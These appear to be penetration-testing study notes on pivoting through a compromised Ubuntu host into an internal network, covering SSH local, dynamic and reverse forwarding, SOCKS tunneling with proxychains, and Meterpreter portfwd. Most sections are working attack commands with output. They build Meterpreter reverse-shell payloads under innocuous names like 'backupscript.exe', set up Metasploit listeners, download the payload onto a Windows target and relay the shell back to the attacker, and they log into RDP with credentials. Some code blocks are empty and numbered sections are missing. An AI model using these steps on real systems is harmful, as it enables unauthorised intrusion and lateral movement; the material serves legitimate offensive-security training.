## 1. Introduction

Everything covered in earlier notes assumed a direct network path between you and whatever you were trying to reach. Real networks are rarely that simple — a compromised machine is often the *only* thing with a connection to some other, otherwise unreachable, internal network. **Pivoting** is the general term for using a machine you already control as a stepping stone to reach systems you otherwise couldn't touch directly.

**Machine labels used throughout this section:**

| Label | Role |
|---|---|
| **HACKER** | Your own attack machine — sits outside the internal network you're trying to reach |
| **PIVOT** | The machine you've already compromised, which has a foot in *both* networks (your attack network and the internal one) — shown as an Ubuntu server in these examples |
| **WINDOWS_TARGET** | A machine sitting *only* on the internal network, reachable only by going through PIVOT |

Think of PIVOT like a building with two doors: one opens onto the street where you're standing (your attack host), and the other opens into a private courtyard (the internal network) that you can't otherwise get into. Pivoting is about using that building as a passage between the two, rather than needing your own door directly into the courtyard.

## 2. Port Forwarding in Context

**Port forwarding** redirects a communication request from one port to another. It fundamentally relies on **TCP** as the underlying transport, but the *forwarded* traffic itself can be wrapped inside different protocols — SSH being one common choice, or SOCKS (which isn't technically an "application layer" protocol in the traditional sense, but serves a similar forwarding role).

This matters for two connected reasons: it can get you around firewall restrictions, and it lets you reuse services already running on a compromised host as a bridge into otherwise unreachable networks.

## 3. SSH Local Port Forwarding

**Scenario:** HACKER (`10.10.15.x`) has compromised an Ubuntu server, PIVOT (`10.129.202.64`).

**Step 1 — On HACKER: scan PIVOT for open ports.**
```
$ nmap -sT -p22,3306 10.129.202.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```
*`-sT` runs a full TCP connect scan (as opposed to a stealthier half-open scan). The result shows SSH open, and MySQL reported as "closed" — meaning MySQL is only listening on PIVOT's own loopback interface (`localhost`), not accepting connections from the outside network directly.*

**Why forward the port instead of just SSHing in and using MySQL locally?** 
- You *could* just SSH into PIVOT and run the MySQL client from there. But if the actual goal is to run a MySQL exploit tool *from HACKER* against that service, that tool needs to connect to MySQL as if it were a normal network service — which it can't do if MySQL only exists inside an SSH session on PIVOT.
- Port forwarding solves this by making the remote, closed-off service appear to be running locally on HACKER.

**Step 2 — On HACKER: forward local port 1234 to PIVOT's MySQL port.**
```
$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

ubuntu@10.129.202.64's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
```
*`-L local_port:destination_host:destination_port` asks the SSH server on PIVOT to forward anything sent to HACKER's local port 1234 onward to `localhost:3306` — but "localhost" here means PIVOT's own loopback, since that's the frame of reference the SSH server is working from. The result: traffic to HACKER's port 1234 ends up reaching MySQL on PIVOT, exactly as if MySQL were running locally on HACKER.*

**Step 3 — On HACKER: confirm the forward is working.**

Using netstat:
```
$ netstat -antp | grep 1234

tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            
tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh
```
*This confirms the local SSH process itself (PID 4034) is the one listening on port 1234 — not MySQL directly, since MySQL is still physically running on PIVOT; SSH is just relaying traffic to and from it.*

Using Nmap:
```
$ nmap -v -sV -p1234 localhost

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
```
*Scanning HACKER's own local port 1234 and getting a MySQL version banner back confirms the forward is genuinely working end-to-end.*

**Forwarding multiple ports at once** — just repeat the `-L` flag:
```
$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```
*This forwards PIVOT's MySQL (3306 → local 1234) and its Apache web server (80 → local 8080) in a single SSH session.*

## 4. Dynamic Port Forwarding with SSH and SOCKS Tunneling

### 4.1 Finding a Second Network to Pivot Into

Running `ifconfig` on PIVOT reveals it actually has multiple network interfaces:
```
ubuntu@WEB01:~$ ifconfig 

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
```
*`ens192` connects back to HACKER's network (`10.129.x.x`), while `ens224` connects to an entirely separate internal network (`172.16.5.x`) that HACKER has no direct route to. This is exactly the "two doors" situation described in the introduction — PIVOT genuinely bridges both networks.*

Unlike the previous MySQL example, there's no way to know in advance exactly which service on which port to forward, since the internal `172.16.5.0/23` network hasn't been explored yet. What's needed here is a way to scan the *entire* internal network through PIVOT — and that calls for **dynamic port forwarding**, rather than the fixed, single-service forwarding used with `-L`.

### 4.2 What Is SOCKS, and Why Use It?

**SOCKS** ("Socket Secure") is a protocol built specifically to help route traffic through firewall restrictions. Unlike a typical connection where a client reaches out to connect to a service directly, with SOCKS the client first connects to a **SOCKS server**, and that server then forwards traffic on the client's behalf to whatever destination the client actually wants to reach. 

*Picture it like a forwarding desk at a hotel: instead of mailing a letter directly to someone's home address, you hand it to the front desk, who then delivers it onward — the front desk is the one actually sitting between you and the final recipient.*

This technique is especially useful for getting past firewalls, and it also has an added benefit for NAT'd (Network Address Translated) networks: a SOCKS proxy can create a route out to an external server even from inside a NAT'd environment, where devices don't otherwise have their own directly reachable addresses.

There are two SOCKS versions in common use: **SOCKS4**, which offers no authentication and no UDP support, and **SOCKS5**, which supports both.

### 4.3 Setting Up Dynamic Forwarding and Proxychains

**Step 1 — On HACKER: start dynamic port forwarding over SSH to PIVOT.**
```
$ ssh -D 9050 ubuntu@10.129.202.64
```
`-D 9050` asks the SSH server on PIVOT to enable dynamic port forwarding, and SSH on HACKER begins listening locally on port 9050. 

Conceptually: HACKER's SSH client asks PIVOT's SSH server for permission to tunnel arbitrary TCP data, PIVOT acknowledges, and from that point on, anything sent to HACKER's local port 9050 gets relayed across the SSH tunnel out into PIVOT's internal network — effectively turning HACKER's local port 9050 into a SOCKS entry point for the entire `172.16.5.0/23` range.

**Step 2 — On HACKER: point `proxychains` at that SOCKS listener.**

`proxychains` is a tool that forces another program's TCP traffic through a proxy server — SOCKS4/5, Tor, or HTTP/HTTPS — and can even chain several proxies together. It also conveniently hides the originating host's real IP address from the final destination, since the destination only ever sees PIVOT's address.

Edit `/etc/proxychains.conf` and make sure the last line points at the SSH tunnel's port:
```
$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```
*This tells proxychains: route traffic through a SOCKS4 proxy running on the local machine (`127.0.0.1`), port `9050` — which, thanks to Step 1, is actually the SSH dynamic forward into PIVOT's internal network.*

### 4.4 Scanning and Pivoting with Nmap, Metasploit, and xfreerdp

```

```
*Each `|S-chain|` line shows proxychains routing a connection attempt through `127.0.0.1:9050` (the local SOCKS tunnel) out to each target address on the internal network. This overall technique — wrapping a tool's traffic through a SOCKS proxy and forwarding it over SSH — is called **SOCKS tunneling**.*

> **Two important limitations to keep in mind:**
> 1. Only a **full TCP connect scan** works reliably over proxychains — it can't interpret partial packets, so stealthier half-open scans will return incorrect results.
> 2. **Host-alive (ping) checks often fail against Windows targets**, since Windows Defender Firewall blocks ICMP (traditional ping) requests by default — meaning a Windows host might appear "down" even though it's actually up and reachable on specific TCP ports.

Because a full connect scan without ping across an entire subnet can take a very long time, it's usually more practical to focus on individual hosts or smaller ranges already known to be alive — in this case, a specific Windows host at `172.16.5.19`.

## 5. Remote/Reverse Port Forwarding with SSH

Local port forwarding (`-L`) and dynamic forwarding (`-D`) both help HACKER *reach into* an internal network. But sometimes the problem runs the other way: you need something *inside* that internal network (WINDOWS_TARGET) to connect *back out* to HACKER — the classic "reverse shell" scenario — and WINDOWS_TARGET has no direct route out to HACKER's network at all, only to PIVOT.

**Why this is a problem:** RDP access alone (from the previous section) isn't always enough. Sometimes you need to upload/download files (especially if the RDP clipboard is disabled), run exploits, or use a Meterpreter session's deeper low-level API access — none of which a plain RDP session provides. A reverse shell from WINDOWS_TARGET straight to HACKER's Metasploit listener simply won't connect, because WINDOWS_TARGET's network stack has no idea how to route traffic to HACKER's address range at all.

**The fix:** use PIVOT — the one machine with a foot in both networks — as a relay point for the reverse connection too.

**Step 1 — On HACKER: generate a Windows Meterpreter payload configured to call back to PIVOT (not HACKER directly).**
```
$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```
*`lhost` is set to PIVOT's internal-facing IP (`172.16.5.129`), not HACKER's — because WINDOWS_TARGET can only route traffic to PIVOT, not to HACKER directly. `LPORT=8080` is the port on PIVOT the payload will try to connect to.*

**Step 2 — On HACKER: start a Metasploit listener to eventually receive the forwarded connection.**
```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```
*This listener runs on HACKER's port 8000 — note that's a different port than the payload's target (8080 on PIVOT); the SSH remote forward set up later is what bridges the two.*

**Step 3 — On HACKER: copy the payload onto PIVOT using SCP.**
```
$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00
```

**Step 4 — On PIVOT: serve that payload over a quick Python web server, so WINDOWS_TARGET can download it.**
```
ubuntu@Webserver$ python3 -m http.server 8123
```

**Step 5 — On WINDOWS_TARGET: download the payload from PIVOT.**
```
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```
*This works because WINDOWS_TARGET and PIVOT share the same internal network (`172.16.5.x`), even though WINDOWS_TARGET has no route to HACKER at all.*

**Step 6 — On HACKER: set up the SSH remote forward that bridges PIVOT's port 8080 to HACKER's listener on port 8000.**
```
$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
- `-R` is the mirror image of `-L` from Section 3 — instead of asking the SSH server to forward *to* a remote destination, it asks the SSH server (on PIVOT) to *listen* on `<PIVOT's IP>:8080`, and forward anything that arrives there back through the SSH tunnel to HACKER's `0.0.0.0:8000` (the Metasploit listener).
- `-v` enables verbose logging, and `-N` tells SSH not to open an interactive shell — this session exists purely to maintain the forward, nothing else.

**Step 7 — Execute the payload on WINDOWS_TARGET, and watch the forward do its job.**

Verbose SSH logs on the forwarding session (visible wherever that `-R` command was run) show the connection being relayed:
```

debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
```

*Each log entry confirms a connection originating from WINDOWS_TARGET (`172.16.5.19`) arriving at PIVOT's listener (port 8080) and being successfully relayed onward to HACKER's handler (port 8000).*

Running `netstat` would confirm this incoming connection is actually associated with the local SSH process, not a raw network socket from WINDOWS_TARGET.*

## 6. Meterpreter Tunneling & Port Forwarding

Everything so far has relied on SSH to do the actual forwarding. If the access to PIVOT is instead a **Meterpreter session** (rather than SSH credentials), Metasploit provides its own equivalent pivoting capabilities, without needing SSH at all.

### 6.1 Getting a Meterpreter Shell on the Pivot

**Step 1 — On HACKER: build a Linux Meterpreter payload for PIVOT.**
```
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```
*`LHOST=10.10.14.18` here is HACKER's own address — since PIVOT already has a direct route to HACKER, no additional relay machine is needed for this particular shell.*

**Step 2 — On HACKER: start a listener for it.**
```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080
```

**Step 3 — Copy the payload to PIVOT and run it there.**
```
ubuntu@WebServer:~$ ls

backupjob
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```
*`chmod +x` marks the file as executable (Linux doesn't rely on file extensions like `.exe` to determine what can run — the executable permission bit is what matters).*

**Confirming success, back on HACKER:**
```
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 )
meterpreter > pwd

/home/ubuntu
```

### 6.2 Ping Sweeps Through the Pivot

A **ping sweep** checks which addresses in a range are actually alive, before investing time scanning every single one in depth. With the Meterpreter session on PIVOT established, a built-in module can generate this ICMP traffic *from PIVOT's* perspective into the internal network:
```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

**Alternative — running a manual ping sweep directly on a pivot host**, useful if the Metasploit module isn't suitable or available:

On a Linux pivot:
```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
*A shell loop that pings each address from `.1` to `.254` once (`-c 1`), backgrounding each ping (`&`) so they all run roughly in parallel rather than one at a time, and filtering output to only show lines confirming a reply ("bytes from").*

On a Windows pivot, using CMD:
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
*`for /L` counts from 1 to 254. `-n 1` sends a single ping, `-w 100` sets a 100ms timeout per attempt, and `find "Reply"` filters down to only successful replies.*

On a Windows pivot, using PowerShell:
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```
*`1..254` generates the range of numbers to substitute into the address. `Test-Connection -quiet` returns a simple true/false result for whether a given host responded, rather than full ping output.*

> **Timing note:** a ping sweep may not get successful replies on the very first pass, especially across network boundaries — this is often because the target hasn't yet built an ARP cache entry (its internal mapping of IP addresses to hardware addresses) for the pivot's traffic. Running the sweep at least twice gives time for that cache to populate.

**When ICMP itself is blocked** (common on Windows firewalls by default), a full TCP scan through a SOCKS proxy becomes the fallback — covered next.

### 6.3 Metasploit's Own SOCKS Proxy + AutoRoute

Rather than relying on SSH's `-D` dynamic forwarding, Metasploit can run its own SOCKS proxy module, routing traffic through an existing Meterpreter session instead.

**Step 1 — Start Metasploit's `socks_proxy` auxiliary module.**

```
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
```

### 6.4 Meterpreter's portfwd (Local Forwarding)

As an alternative to a full SOCKS proxy, Meterpreter's **portfwd** module forwards a single port at a time, similar in spirit to SSH's `-L`.
```
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

**Creating a local relay to the Windows target's RDP port:**
```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```
*`-l 3300` sets the port to listen on at HACKER (the forward direction's "local" side). `-p 3389` and `-r 172.16.5.19` specify the remote port and host to actually connect to — WINDOWS_TARGET's RDP service, reached via the Meterpreter session on PIVOT.*

**Connecting through that relay:**
```
$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
*From HACKER's perspective, this looks exactly like connecting to a local RDP server on port 3300 — all the actual pivoting happens transparently behind the scenes.*

**Confirming the established session with netstat:**
```
$ netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp
```
*From a defensive standpoint, this same `netstat` technique is exactly what a defender on a compromised host might use to spot a suspicious local connection or relay — worth remembering as a detection angle, not just an attacker's verification step.*

### 6.5 Meterpreter's portfwd (Reverse Forwarding)

Just as SSH supports both `-L` (forward) and `-R` (reverse), Meterpreter's `portfwd` supports a `-R` reverse mode too — useful for catching an incoming shell from WINDOWS_TARGET, relayed through PIVOT, without needing a separate SSH session at all.

**Step 1 — Create the reverse forwarding rule on the existing Meterpreter session (on PIVOT).**
```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```
*`-R` flags this as a reverse forward. `-p 1234` is the port PIVOT will listen on for incoming connections (from WINDOWS_TARGET). `-l 8081` and `-L 10.10.14.18` specify where to relay those connections to — HACKER's address and port 8081.*

**Step 2 — Background the Meterpreter session and configure a fresh listener for the incoming Windows shell.**
```
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081
```
*`bg` sends the current Meterpreter session to the background without closing it, freeing up the console to configure a new listener.*

**Step 3 — Generate a Windows payload configured to call back to PIVOT (not HACKER), on the port the reverse forward is watching.**
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```
*Just as in Section 5, `LHOST` points at PIVOT's internal address — because WINDOWS_TARGET can only reach PIVOT directly, not HACKER.*

**Step 4 — Execute the payload on WINDOWS_TARGET.** The connection flow: WINDOWS_TARGET connects to PIVOT on port 1234 → the Meterpreter reverse portfwd relays it to HACKER on port 8081 → the waiting listener catches it:
```
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```
*A full shell on WINDOWS_TARGET, entirely relayed through PIVOT, without ever needing a direct network route between WINDOWS_TARGET and HACKER, and without needing SSH credentials on PIVOT at all — just the existing Meterpreter session.*

## 9. Big-Picture Takeaways

1. **A pivot host is only useful because it has a foot in two networks at once.** Every technique in this section — SSH forwarding, SOCKS tunneling, Meterpreter's portfwd — depends entirely on that one structural fact: the pivot can reach both sides, even though the attack host and the final target can't reach each other directly.
2. **Forward vs. reverse is about which side initiates, not which side "wins."** Local forwarding (`-L` / `portfwd add`) is for reaching *into* a network; remote/reverse forwarding (`-R` / `portfwd add -R`) is for letting something *inside* that network call back *out* — picking the right one depends entirely on which side can actually open the first connection.
3. **SOCKS tunneling and single-port forwarding solve different problems.** Forwarding a specific port (`-L`) is ideal when you already know exactly which service you need; a SOCKS tunnel plus proxychains is the right tool when you need to run broad, exploratory tools (Nmap, Metasploit modules) against an entire unknown subnet.
4. **SSH and Meterpreter offer parallel, largely equivalent capabilities.** Nearly everything SSH's `-L`/`-D`/`-R` flags accomplish, Meterpreter's `portfwd` and `socks_proxy`/`autoroute` combination can also accomplish — the right choice mostly comes down to which kind of access (SSH credentials vs. an existing Meterpreter session) is actually available on the pivot.
5. **Scan type and protocol limitations matter more once you're pivoting.** A full TCP connect scan is the only reliable option through proxychains, and ICMP-based host-alive checks frequently fail against Windows targets — both are easy to forget and can waste significant time if not accounted for up front.
6. **A relayed connection changes what the "source" looks like.** Both the SSH-relayed Meterpreter session (showing `127.0.0.1` as its origin) and the portfwd-based RDP session are reminders that pivoted traffic doesn't look like a normal direct connection — which matters both for troubleshooting as an attacker and for spotting this activity as a defender reviewing `netstat` output on a potentially compromised host.
